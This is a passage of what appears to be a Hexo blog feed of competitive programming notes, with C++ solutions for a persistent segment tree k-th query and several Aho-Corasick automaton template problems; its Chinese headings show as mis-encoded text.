a=<span class="number">0</span>,po=<span class="number">1</span>;<span class="keyword">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch)&amp;&amp;ch!=<span class="string">&#x27;-&#x27;</span>) ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span> (ch==<span class="string">&#x27;-&#x27;</span>) po=<span class="number">-1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) a=a*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> a*po; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> n,m,a[maxn],root[maxn],cnt;<span class="comment">//n,må¦‚é¢˜æ„æ‰€ç¤ºï¼Œaä¸ºåŸæ•°ç»„ï¼Œcntä¸ºå·²åˆ†é…èŠ‚ç‚¹æ•°é‡ </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> pre,<span class="keyword">int</span> &amp;now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    tree[++cnt]=tree[pre];</span><br><span class="line">    now=cnt;</span><br><span class="line">    tree[now].sum++;</span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(p&lt;=m)<span class="built_in">insert</span>(l,m,tree[pre].l,tree[now].l,p);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">insert</span>(m+<span class="number">1</span>,r,tree[pre].r,tree[now].r,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> start,<span class="keyword">int</span> end,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp=tree[tree[end].l].sum-tree[tree[start].l].sum;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=tmp)<span class="keyword">return</span> <span class="built_in">query</span>(l,m,tree[start].l,tree[end].l,k);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">query</span>(m+<span class="number">1</span>,r,tree[start].r,tree[end].r,k-tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">     n=<span class="built_in">read</span>(),m=<span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        v.<span class="built_in">push_back</span>(a[i]=<span class="built_in">read</span>());</span><br><span class="line">    <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br><span class="line">    v.<span class="built_in">erase</span>(<span class="built_in">unique</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>()),v.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">insert</span>(<span class="number">1</span>,v.<span class="built_in">size</span>(),root[i<span class="number">-1</span>],root[i],<span class="built_in">getid</span>(a[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> l,r,k;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        l=<span class="built_in">read</span>(),r=<span class="built_in">read</span>(),k=<span class="built_in">read</span>();</span><br><span class="line">        cout&lt;&lt;v[<span class="built_in">query</span>(<span class="number">1</span>,v.<span class="built_in">size</span>(),root[l<span class="number">-1</span>],root[r],k)<span class="number">-1</span>]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> æ•°æ®ç»“æ„ </category>
          
          <category> ä¸»å¸­æ ‘ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ACè‡ªåŠ¨æœºçš„å­¦ä¹ </title>
      <link href="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>æ´›è°·çš„æ¿å­</p><span id="more"></span><h2 id="é¢˜ç›®1"><a href="#é¢˜ç›®1" class="headerlink" title="é¢˜ç›®1"></a>é¢˜ç›®1</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">bool</span> b[maxn];</span><br><span class="line">string word,s;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    A *fail;</span><br><span class="line">    A *next[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">int</span> word;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            next[i]=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fail=<span class="literal">NULL</span>; </span><br><span class="line">        word=<span class="number">0</span>;</span><br><span class="line">        num=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;node;</span><br><span class="line">node *root;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_word</span><span class="params">(<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=word.<span class="built_in">length</span>();</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=word[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next[k]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node *temp;</span><br><span class="line">            temp=<span class="keyword">new</span> node;</span><br><span class="line">            temp-&gt;<span class="built_in">a</span>();</span><br><span class="line">            p-&gt;next[k]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next[k];    </span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;word=j;</span><br><span class="line">    p-&gt;num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;node *&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                node *t=p-&gt;next[i];</span><br><span class="line">                <span class="keyword">if</span>(p==root)&#123;</span><br><span class="line">                    t-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    node *fafail=p-&gt;fail;</span><br><span class="line">                    <span class="keyword">while</span>(fafail!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(fafail-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                            t-&gt;fail=fafail-&gt;next[i];</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        fafail=fafail-&gt;fail;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(fafail==<span class="literal">NULL</span>)t-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                q.<span class="built_in">push</span>(t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=s.<span class="built_in">length</span>();</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=s[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(p!=root&amp;&amp;p-&gt;next[k]==<span class="literal">NULL</span>)</span><br><span class="line">            p=p-&gt;fail;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">            p=root;</span><br><span class="line">        node *temp=p;</span><br><span class="line">        <span class="comment">//while(temp!=root)&#123;</span></span><br><span class="line">            <span class="keyword">if</span>(temp-&gt;word&amp;&amp;!b[temp-&gt;word])&#123;</span><br><span class="line">                b[temp-&gt;word]=<span class="number">1</span>;</span><br><span class="line">                ans+=temp-&gt;num;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//    temp=temp-&gt;fail;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int c[10001];</span></span><br><span class="line"><span class="comment">int all=0;</span></span><br><span class="line"><span class="comment">void print()&#123;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=all;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%c&quot;,b[i]+&#x27;a&#x27;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">void dfs(node *t)&#123;</span></span><br><span class="line"><span class="comment">    if(t-&gt;word)print();</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;26;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(t-&gt;next[i]!=NULL)&#123;</span></span><br><span class="line"><span class="comment">            c[++all]=i;</span></span><br><span class="line"><span class="comment">            dfs(t-&gt;next[i]);</span></span><br><span class="line"><span class="comment">            all--;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3808.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;P3808.out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">    root=<span class="keyword">new</span> node;</span><br><span class="line">    root-&gt;<span class="built_in">a</span>();</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;word;</span><br><span class="line">        <span class="built_in">insert_word</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//dfs(root);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fail</span>();</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;s)&#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">        cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®2"><a href="#é¢˜ç›®2" class="headerlink" title="é¢˜ç›®2"></a>é¢˜ç›®2</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> word;</span><br><span class="line">    A* fail;</span><br><span class="line">    A* next[<span class="number">26</span>];</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span></span>&#123;</span><br><span class="line">        word=<span class="number">0</span>;</span><br><span class="line">        fail=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">            next[i]=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;node;</span><br><span class="line">node *root;</span><br><span class="line">queue&lt;node*&gt;q;</span><br><span class="line">map&lt;string,<span class="keyword">int</span>&gt;tmap;</span><br><span class="line">string word[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">char</span> t[<span class="number">1000010</span>];</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">int</span> len=word[x].<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=word[x][i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next[k]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node *new_node=<span class="keyword">new</span> node;</span><br><span class="line">            new_node-&gt;<span class="built_in">aaa</span>();</span><br><span class="line">            p-&gt;next[k]=new_node;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;word=x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                node *k=p-&gt;next[i];</span><br><span class="line">                q.<span class="built_in">push</span>(k);</span><br><span class="line">                <span class="keyword">if</span>(p==root)&#123;</span><br><span class="line">                    k-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    node *fafail=p-&gt;fail;</span><br><span class="line">                    <span class="keyword">while</span>(fafail!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(fafail-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                            k-&gt;fail=fafail-&gt;next[i];</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        fafail=fafail-&gt;fail;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(fafail==<span class="literal">NULL</span>)k-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(t);</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=t[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next[k]==<span class="literal">NULL</span>&amp;&amp;p!=root)p=p-&gt;fail;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)p=root;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node *temp=p;</span><br><span class="line">            <span class="keyword">while</span>(temp!=root)&#123;</span><br><span class="line">                <span class="keyword">if</span>(temp-&gt;word)&#123;</span><br><span class="line">                    num[temp-&gt;word]++;</span><br><span class="line">                &#125;</span><br><span class="line">                temp=temp-&gt;fail;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(string a,string b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num[tmap[a]]==num[tmap[b]])<span class="keyword">return</span> tmap[a]&lt;tmap[b];</span><br><span class="line">    <span class="keyword">return</span> num[tmap[a]]&gt;num[tmap[b]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)&amp;&amp;n)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(num));</span><br><span class="line">        tmap.<span class="built_in">clear</span>();</span><br><span class="line">        root=<span class="keyword">new</span> node;</span><br><span class="line">        root-&gt;<span class="built_in">aaa</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            cin&gt;&gt;word[i];</span><br><span class="line">            tmap[word[i]]=i;</span><br><span class="line">            <span class="built_in">insert</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">build_fail</span>();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,t);</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">        <span class="built_in">sort</span>(word+<span class="number">1</span>,word+<span class="number">1</span>+n,cmp);</span><br><span class="line">        <span class="built_in">sort</span>(num+<span class="number">1</span>,num+<span class="number">1</span>+n,cmp1);</span><br><span class="line">        <span class="keyword">int</span> maxnum=num[<span class="number">1</span>];</span><br><span class="line">        cout&lt;&lt;maxnum&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[i]==maxnum)&#123;</span><br><span class="line">                cout&lt;&lt;word[i]&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®3"><a href="#é¢˜ç›®3" class="headerlink" title="é¢˜ç›®3"></a>é¢˜ç›®3</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 